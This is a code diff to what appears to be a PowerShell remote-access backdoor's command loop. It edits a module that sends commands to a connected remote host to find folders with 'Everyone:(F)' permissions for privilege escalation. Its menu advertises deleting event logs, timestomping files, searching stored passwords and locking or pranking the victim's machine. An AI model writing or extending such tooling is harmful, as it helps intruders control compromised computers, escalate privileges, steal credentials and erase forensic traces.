@@ -461,13 +461,14 @@ While($Client.Connected)
         }
         If($my_choise -eq "WeakDir" -or $my_choise -eq "Dir")
         {
-          write-host " List Folder(s) Weak Permissions Recursive (Everyone)." -ForegroundColor Blue -BackgroundColor White;
-          write-host " { find 'Everyone' Permitions starting in Input dir }" -ForegroundColor Green;
+          write-host " List Folder(s) Weak Permissions Recursive [ Everyone:(F) ]." -ForegroundColor Blue -BackgroundColor White;
+          write-host " { Search for 'Everyone:(F)' Permissions starting in Input dir }" -ForegroundColor Green;
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
           $RfPath = Read-Host;Write-Host "`n`n";
-          #$Command = "cd $final_path;cmd /c `"FOR /f `"tokens=*`" %G IN ('dir /A:D /b /s') DO cmd /c icacls `"%G`"|findstr /i `"Everyone`" `>`> %tmp%\WeakPrivs.txt`";Get-Content `$env:tmp\WeakPrivs.txt;Remove-Item `$env:tmp\WeakPrivs.txt -Force";
-          $Command = "icacls `"$RfPath\*`"|findstr `"Everyone`" `> WeakFP.txt;`$a = Get-Content WeakFP.txt|findstr `"Everyone`";If(`$a){Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}else{echo `"   None Weak Folder Permissions Found (Everyone (OI) (CI) (F)) ..`" `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}";
-        }
+          #$Command = "icacls `"$RfPath\*`"|findstr /C:`"Everyone:(F)`" `> WeakFP.txt;`$a = Get-Content WeakFP.txt|findstr `"Everyone:(OI)(CI)(F)`";If(`$a){Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}else{echo `"   None Weak Folder Permissions Found (Everyone (OI) (CI) (F)) ..`" `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}";
+          #$Command = "cmd /R icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"(F)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   None Weak Folders Permissions Found [ Everyone:(F) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
+          $Command = "cmd /R icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"(F)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   None Weak Folders Permissions Found [ Everyone:(F) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
+       }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
           write-host " List Remote-Host Unquoted Service Paths." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
@@ -769,7 +770,7 @@ While($Client.Connected)
       write-host "   ListLog   List/Delete EventLogs           Remote List/Delete eventvwr Logs";
       write-host "   SetMace   Change files date/time          Change Remote-Host Files TimeStomp";
       write-host "   ListPas   Search remote passwords         Search stored passwords in txt|logs";
-      write-host "   ListDir   Search for hidden folders       Search for hidden folder recursive";
+      write-host "   ListDir   Search for hidden folders       Search for hidden folders recursive";
       write-host "   GoogleX   Open Google Sphere(prank)       Open Remote Browser in google sphere";
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
